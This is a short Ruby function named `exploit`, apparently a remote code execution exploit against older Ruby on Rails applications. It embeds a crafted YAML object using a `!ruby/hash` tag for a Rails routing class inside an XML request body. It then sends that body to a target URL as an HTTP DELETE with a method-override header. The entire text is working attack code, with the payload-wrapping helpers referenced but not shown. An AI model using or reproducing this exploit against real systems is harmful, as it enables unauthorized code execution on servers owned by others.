def exploit(url, payload, target = :rails3)
  escaped_payload = escape_payload(wrap_payload(payload), target)
  encoded_payload = escaped_payload.to_yaml.sub('--- ', '').chomp

  yaml = %{
--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
? #{encoded_payload}
: !ruby/struct
  defaults:
    :action: create
    :controller: foos
  required_parts: []
  requirements:
    :action: create
    :controller: foos
  segment_keys:
    - :format
  }.strip

  xml = %{
<?xml version="1.0" encoding="UTF-8"?>
<exploit type="yaml">#{CGI.escapeHTML(yaml)}</exploit>
  }.strip

  uri = URI.parse(url)
  request = Net::HTTP::Delete.new(uri.path)
  request['Content-Type'] = 'text/xml'
  request['X-HTTP-Method-Override'] = 'delete'
  request.body = xml

  response = Net::HTTP.start(uri.host, uri.port) do |http|
    http.request(request)
  end

  response
end
